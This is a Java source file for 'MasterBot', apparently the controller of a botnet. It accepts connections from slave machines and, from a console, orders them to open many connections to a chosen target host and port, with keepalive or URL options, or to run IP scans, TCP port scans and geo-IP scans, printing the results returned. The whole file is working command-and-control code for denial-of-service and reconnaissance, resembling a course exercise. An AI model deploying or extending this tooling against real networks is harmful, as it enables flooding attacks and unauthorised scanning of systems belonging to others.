import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.*;
import java.text.*;

class sConnection
{
    String 	Date;
    String 	HostName;
    String 	HostIP;
    int	PORT;
    Socket 	Socket;
    sConnection()
    {
        Date date = new Date();
        SimpleDateFormat f = new SimpleDateFormat("yyyy-MM-dd");
        String format = f.format(date);
        Date=format;
    }
}

public class MasterBot
{
  public static volatile String Cmd;
  public static ArrayList<sConnection> connectionList;
  public static void main(String[] args) throws Exception
  {
    connectionList = new ArrayList<sConnection>();
	if(args.length<2)
    {
        System.err.println("*****Error: Port number should be provided for server.");
        System.exit(-1);
	}
    try
    {
        String port="";
        if(args[0].equals("-p"))
        {
      		port=args[1];
        }
        else
        {
            System.err.println("*****Error: Port number should be provided for server.");
            System.exit(-1);
        }
        SocketThread clientThread = new SocketThread(Integer.parseInt(port));
        clientThread.start();
        while(true)
        {
            System.out.print(">");
            BufferedReader UI = new BufferedReader(new InputStreamReader(System.in));
            Cmd= UI.readLine();
            if (Cmd !="" && ! Cmd.equals("list") )
            {
 			String[] serverCmd = Cmd.split(" ");
			boolean keepAlive = false;
            String url = "";
            if(serverCmd[0].equals("connect"))
            {
                if(serverCmd.length<4)
                {
                    System.out.println("*****Error: Connect expects minimum 3 arguments");
                }
                else
                {
                    if(serverCmd[1] != null && serverCmd[2]!= null && serverCmd[3]!= null)
                    {
							int CONNECTIONS;
							if(serverCmd.length>4)
							{
								CONNECTIONS= Integer.parseInt(serverCmd[4]);
							}
							else
								CONNECTIONS=1;
							Iterator<sConnection> i = connectionList.iterator();
							int Argument;
							if (serverCmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								Argument=1;
							}
							else if(serverCmd[1].equals("all") ){	Argument=3; }
							else {Argument=2;}

							switch (Argument)
                            {
							    case 1:
								while(i.hasNext())
                                {
								   	sConnection currentSocket = i.next();
									if(currentSocket.HostName.equals(serverCmd[1]))
                                    {
                                        try
                                        {
                                            PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));

                                            if(serverCmd.length>5)
                                            {
                                                if(serverCmd[5].equalsIgnoreCase("keepalive"))
                                                {
                                                    keepAlive = true;
                                                    netOut.println( "connect "+serverCmd[2]+" "+serverCmd[3]+" "+CONNECTIONS+" "+keepAlive);
                                                }
                                                else if(serverCmd[5].matches("^url=[^ ]+$"))
                                                {
                                                    url = serverCmd[5].substring(4);
                                                    netOut.println( "connect "+serverCmd[2]+" "+serverCmd[3]+" "+CONNECTIONS+" "+ "url=" + url);
                                                }
                                            }
                                            else
                                            {
                                                netOut.println("connect "+ serverCmd[2] + " "+ serverCmd[3] + " "+CONNECTIONS);
                                            }
                                            netOut.flush();
                                        }
                                        catch (Exception e)
                                        {
                                            System.err.println("*****Error: Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
                                        }
                                    }
                                }
                                break;
							    case 2:
                                    while(i.hasNext())
                                    {
                                        sConnection currentSocket = i.next();
                                        if(currentSocket.HostIP.equals(serverCmd[1]))
                                        {
                                            try
                                            {
                                                PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));
                                                netOut.println("connect "+ serverCmd[2] + " "+ serverCmd[3] + " "+CONNECTIONS);
                                                netOut.flush();
                                            }
                                            catch(Exception e)
                                            {
                                                System.err.println("*****Error:  Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
                                            }
                                        }
                                    }
                                    break;
							    case 3:
                                    while(i.hasNext())
                                    {
                                        sConnection currentSocket = i.next();
                                        try
                                        {
                                            PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));
                                            netOut.println("connect "+ serverCmd[2] + " "+ serverCmd[3] + " "+CONNECTIONS);
                                            netOut.flush();
                                        }
                                        catch(Exception e)
                                        {
                                            System.err.println("*****Error: Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
                                        }
									}
                                    break;
							}
						}
						else
                        {
							System.out.println("*****Error: No proper arguments for connect");
						}
                    }
                }
                else if(serverCmd[0].equals("ipscan"))
                {
                    if(serverCmd.length<3)
                    {
                        System.out.println("*****Error: Ipscan expects minimum 2 arguments");
                    }
                    else
                    {
						if(serverCmd[1] != null && serverCmd[2]!= null)
						{
							Iterator<sConnection> i = connectionList.iterator();
							int Argument;
							if (serverCmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								Argument=1; }
							else if(serverCmd[1].equals("all") ) {	Argument=3; }
							else {	Argument=2;}
							sConnection currentSocket = null;
							switch(Argument)
							{
							    case 1:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									if(currentSocket.HostName.equals(serverCmd[1]))
									{
										ScanOperations ipscan = new ScanOperations(1,currentSocket.Socket,"ipscan "+ serverCmd[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 2:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
                                    if(currentSocket.HostIP.equals(serverCmd[1]))
                                    {
										ScanOperations ipscan = new ScanOperations(2,currentSocket.Socket,"ipscan "+ serverCmd[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 3:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									ScanOperations ipscan = new ScanOperations(3,currentSocket.Socket,"ipscan "+ serverCmd[2]);
									Thread t1=new Thread(ipscan);
									t1.start();
                                }
                                break;
							}
						}
						else
						{
							System.out.println("*****Error: No proper arguments for ipscan");
						}
                    }
                }
                else if(serverCmd[0].equals("tcpportscan"))
                {
                    if(serverCmd.length<4)
                    {
                        System.out.println("*****Error: tcpportscan expects minimum 2 arguments");
                    }
                    else
                    {
						if(serverCmd[1] != null && serverCmd[2]!= null&& serverCmd[3]!= null)
						{
							Iterator<sConnection> i = connectionList.iterator();
							int Argument;
							if (serverCmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								Argument=1; }
							else if(serverCmd[1].equals("all") ) {	Argument=3; }
							else {	Argument=2;}
							sConnection currentSocket = null;
							switch(Argument)
                            {
							    case 1:
								while(i.hasNext())
                                {
                                    currentSocket = i.next();
									if(currentSocket.HostName.equals(serverCmd[1]))
									{
										ScanOperations ipscan = new ScanOperations(4,currentSocket.Socket,"tcpportscan "+ serverCmd[2]+" "+serverCmd[3]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 2:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									if(currentSocket.HostIP.equals(serverCmd[1]))
									{
										ScanOperations ipscan = new ScanOperations(4,currentSocket.Socket,"tcpportscan "+ serverCmd[2]+" "+serverCmd[3]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 3:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									ScanOperations ipscan = new ScanOperations(4,currentSocket.Socket,"tcpportscan "+ serverCmd[2]+" "+serverCmd[3]);
									Thread t1=new Thread(ipscan);
									t1.start();
                                }
                                break;
							}
						}
						else
						{
							System.out.println("*****Error: No  proper arguments for tcpportscan");
						}
                    }
                }
                else if(serverCmd[0].equals("geoipscan"))
                {
                    if(serverCmd.length<3)
                    {
                        System.out.println("*****Error: geoipscan expects minimum 2 arguments");
                    }
                    else
                    {
						if(serverCmd[1] != null && serverCmd[2]!= null)
						{
							Iterator<sConnection> i = connectionList.iterator();
							int Argument;
							if (serverCmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
								Argument=1; }
							else if(serverCmd[1].equals("all") ) {	Argument=3; }
							else {	Argument=2;}
							sConnection currentSocket = null;
							switch(Argument)
							{
							    case 1:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									if(currentSocket.HostName.equals(serverCmd[1]))
									{
										ScanOperations ipscan = new ScanOperations(5,currentSocket.Socket,"geoipscan "+ serverCmd[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 2:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
                                    if(currentSocket.HostIP.equals(serverCmd[1]))
                                    {
										ScanOperations ipscan = new ScanOperations(6,currentSocket.Socket,"geoipscan "+ serverCmd[2]);
										Thread t1=new Thread(ipscan);
										t1.start();
									}
                                }
                                break;
							    case 3:
								while(i.hasNext())
								{
                                    currentSocket = i.next();
									ScanOperations ipscan = new ScanOperations(7,currentSocket.Socket,"geoipscan "+ serverCmd[2]);
									Thread t1=new Thread(ipscan);
									t1.start();
                                }
                                break;
							}
						}
						else
						{
							System.out.println("*****Error: No proper arguments for geoipscan");
						}
                    }
                }
                else if(serverCmd[0].equals("disconnect"))
                {
                    if(serverCmd.length<3)
                    {
						System.out.println("*****Error: Expects minimum 2 arguments");
					}
					else
					{
                        if(serverCmd[1] != null && serverCmd[2]!= null)
                        {
                            int disPort=0;
                            if(serverCmd.length>3)
                            {
                                disPort= Integer.parseInt(serverCmd[3]);
                            }
                            Iterator<sConnection> i = connectionList.iterator();
                            int Argument;
                            if (serverCmd[1].matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$") == true){
                                Argument=1; }
                            else if(serverCmd[1].equals("all") ) {	Argument=3; }
                            else {	Argument=2;}
                            switch(Argument)
                            {
                                case 1:
                                while(i.hasNext())
                                {
                                    sConnection currentSocket = i.next();
                                    if(currentSocket.HostName.equals(serverCmd[1])){
                                    try
                                    {
                                        PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));
                                        netOut.println("disconnect "+ serverCmd[2] + " "+ disPort);
                                        netOut.flush();
                                    }
                                    catch(Exception e)
                                    {
                                        System.err.println("*****Error: Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
                                    }
                                }
                            }
                            break;
						    case 2:
							while(i.hasNext())
                            {
							   	sConnection currentSocket = i.next();
								if(currentSocket.HostIP.equals(serverCmd[1]))
								{
                                    try
                                    {
                                        PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));
                                        netOut.println("disconnect "+ serverCmd[2] + " "+ disPort);
                                        netOut.flush();
                                    }
                                    catch(Exception e)
                                    {
                                        System.err.println("*****Error: Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
                                    }
                                }
                            }
                            break;
						    case 3:
							while(i.hasNext())
                            {
                                sConnection currentSocket = i.next();
								try
								{
                                    PrintWriter  netOut = new PrintWriter(new OutputStreamWriter(currentSocket.Socket.getOutputStream()));
                                    netOut.println("disconnect "+ serverCmd[2] + " "+ disPort);
									netOut.flush();
								}
                                catch(Exception e)
                                {
                                    System.err.println("*****Error: Not connecting while sending command to socket with "+ currentSocket.HostName+" " + currentSocket.PORT);
								}
                            }
                            break;
						}
					}
					else
					{
						System.out.println("*****Error: No  proper arguments for disconnect");
					}
                }
            }
        }
        if(Cmd.equals("list"))
        {
            for(int i=0;i<connectionList.size(); i++)
            {
                System.out.println(connectionList.get(i).HostIP+" "+connectionList.get(i).HostName + " "+ connectionList.get(i).PORT + " "+ connectionList.get(i).Date);
            }
        }
    }
    }
    catch(Exception e)
    {
        e.printStackTrace();
		System.exit(-1);
    }

  }

}


class SocketThread extends Thread
{

  int portnum;
  sConnection sockList;

  SocketThread(int port)
  {
    portnum = port;
  }

    public void run()
    {
        try
        {
            ServerSocket m_ServerSocket = new ServerSocket(portnum);
		    while(true)
            {
                Socket clientSocket = m_ServerSocket.accept();
                sockList=new sConnection();
                sockList.HostName=clientSocket.getInetAddress().getHostAddress();
                sockList.HostIP=clientSocket.getInetAddress().getHostName();
                sockList.PORT=clientSocket.getPort();
                sockList.Socket=clientSocket;
                MasterBot.connectionList.add(sockList);
		    }
	    }
        catch(Exception e)
        {
	      e.printStackTrace();
	    }
    }
}



class ScanOperations extends Thread
{
	int oprType=0;
	Socket currentSoc=null;
	String msg="";

	ScanOperations(int opr,Socket s, String m)
	{
		oprType=opr;
		currentSoc = s;
		msg=m;
	}

	public void run()
	{
		try
		{
            PrintWriter   netOut = new PrintWriter(new OutputStreamWriter(currentSoc.getOutputStream()));
            netOut.println(msg);
            netOut.flush();
        }
        catch(Exception e)
        {
			System.err.println("*****Error: Not connecting while sending command to slave ");
        }
        BufferedReader netIn;
		try
        {
			netIn = new BufferedReader(new InputStreamReader(currentSoc.getInputStream()));
		    String theLine = "";
		    while((theLine=netIn.readLine())!=null)
		    	System.out.println(theLine);
		}
        catch(IOException e)
        {
			System.err.println("*****Error: Unable to recieve data from slave ");
		}
		System.out.print(">");
	}
}
